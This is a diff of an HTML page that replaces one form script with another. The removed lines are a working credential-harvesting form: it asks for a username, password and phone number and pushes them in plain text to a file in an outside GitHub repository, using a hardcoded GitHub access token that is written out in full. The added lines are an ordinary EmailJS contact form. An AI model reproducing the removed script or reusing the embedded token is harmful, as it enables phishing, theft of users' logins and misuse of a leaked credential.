@@ -3,77 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Input Form</title>
+    <title>Email Form</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        async function uploadToGitHub() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const phone = document.getElementById('phone').value;
+        (function() {
+            // Initialize EmailJS with your public key
+            emailjs.init("Gjx15gLz2eH6G9gt2"); // Public Key
+            
+            document.addEventListener('DOMContentLoaded', function() {
+                document.getElementById('contact-form').addEventListener('submit', function(event) {
+                    event.preventDefault(); // Prevent default form submission
 
-            const token = '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'; // Your GitHub token
-            const fileContent = `Username: ${username}\nPassword: ${password}\nPhone: ${phone}\n\n`;
-            const repo = 'ukgkings/Server';
-            const path = 'server.txt';
+                    // Fetch form data
+                    const formData = {
+                        user_email: document.getElementById('user_email').value,
+                        subject: document.getElementById('subject').value,
+                        message: document.getElementById('message').value
+                    };
 
-            try {
-                // Fetch the file's current SHA to update it
-                const getSHAResponse = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
-                    method: 'GET',
-                    headers: {
-                        'Authorization': `token ${token}`,
-                        'Accept': 'application/vnd.github.v3+json'
-                    }
+                    // Send email using EmailJS
+                    emailjs.send('service_eg5xddf', 'template_cyjps0r', formData)
+                        .then(function(response) {
+                            alert('Email sent successfully!');
+                            console.log('SUCCESS!', response.status, response.text);
+                        }, function(error) {
+                            alert('Failed to send email. Please try again later.');
+                            console.log('FAILED...', error);
+                        });
                 });
-
-                if (!getSHAResponse.ok) {
-                    throw new Error(`Error fetching SHA: ${getSHAResponse.status}`);
-                }
-
-                const shaData = await getSHAResponse.json();
-                const sha = shaData.sha;
-
-                // Prepare the new content (base64 encoded)
-                const newContent = btoa(unescape(encodeURIComponent(fileContent))); // Base64 encode the content
-
-                // Make the PUT request to update the file
-                const updateResponse = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${token}`,
-                        'Accept': 'application/vnd.github.v3+json'
-                    },
-                    body: JSON.stringify({
-                        message: "Updating server.txt with new input",
-                        content: newContent,
-                        sha: sha
-                    })
-                });
-
-                if (!updateResponse.ok) {
-                    throw new Error(`Error updating file: ${updateResponse.status}`);
-                }
-
-                alert("Data uploaded successfully!");
-            } catch (error) {
-                console.error(error);
-                alert(`Failed to upload data: ${error.message}`);
-            }
-        }
+            });
+        })();
     </script>
 </head>
 <body>
-    <h1>Enter Your Information</h1>
-    <form onsubmit="uploadToGitHub(); return false;">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
+    <h1>Contact Us</h1>
+    <form id="contact-form">
+        <label for="user_email">Your Email:</label>
+        <input type="email" id="user_email" name="user_email" required><br><br>
 
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
+        <label for="subject">Subject:</label>
+        <input type="text" id="subject" name="subject" required><br><br>
 
-        <label for="phone">Phone Number:</label>
-        <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required><br><br>
+        <label for="message">Message:</label><br>
+        <textarea id="message" name="message" rows="4" required></textarea><br><br>
 
-        <input type="submit" value="Submit">
+        <input type="submit" value="Send Email">
     </form>
 </body>
 </html>
